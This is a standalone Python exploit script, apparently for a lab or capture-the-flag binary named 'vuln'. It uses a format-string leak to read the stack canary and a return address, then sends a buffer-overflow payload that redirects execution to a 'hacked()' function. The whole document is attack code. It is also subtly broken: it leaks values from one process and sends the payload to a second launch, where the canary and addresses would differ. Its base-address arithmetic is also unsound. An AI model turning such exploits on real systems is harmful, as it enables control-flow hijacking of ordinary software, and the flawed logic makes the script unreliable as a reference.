
#!/usr/bin/env python3
import subprocess
import struct

def leak_canary_and_return_addr():
    p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    payload = b"%p." * 60 + b"\n"
    out, _ = p.communicate(payload)
    leaks = out.decode(errors='ignore').split(".")
    canary, ret_addr = None, None

    for val in leaks:
        if val.startswith("0x"):
            try:
                v = int(val, 16)
                # Heuristic: canary ends in 00 and is large
                if (v & 0xff) == 0 and canary is None and v > 0x100000:
                    canary = v
                # AArch64 text/code addresses are typically in 0x400000 - 0x800000
                if 0x400000 <= v <= 0x800000 and ret_addr is None:
                    ret_addr = v
            except ValueError:
                continue

    return canary, ret_addr, out.decode(errors='ignore')

def build_payload(canary, hacked_addr):
    padding = b"A" * 64
    canary_packed = struct.pack("<Q", canary)
    padding2 = b"B" * 8  # saved FP
    ret = struct.pack("<Q", hacked_addr)
    return padding + canary_packed + padding2 + ret

def main():
    print("[*] Leaking stack canary and return address...")
    canary, ret_addr, raw_output = leak_canary_and_return_addr()

    if not canary or not ret_addr:
        print("[-] Leak failed.")
        print("[*] Full format string output:")
        print(raw_output)
        print("[*] Try increasing number of %p's or adjust leak heuristics.")
        return

    print(f"[+] Leaked canary: {hex(canary)}")
    print(f"[+] Leaked return address: {hex(ret_addr)}")

    # Offset from nm output: nm vuln | grep hacked
    hacked_offset = 0x11cc
    base = ret_addr & 0xfffffffffffff000
    hacked_addr = base + hacked_offset

    print(f"[+] Calculated hacked() address: {hex(hacked_addr)}")

    payload = build_payload(canary, hacked_addr)
    print("[*] Sending final exploit payload...")

    p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate(payload + b"\n")

    print(out.decode(errors='ignore'))

if __name__ == "__main__":
    main()
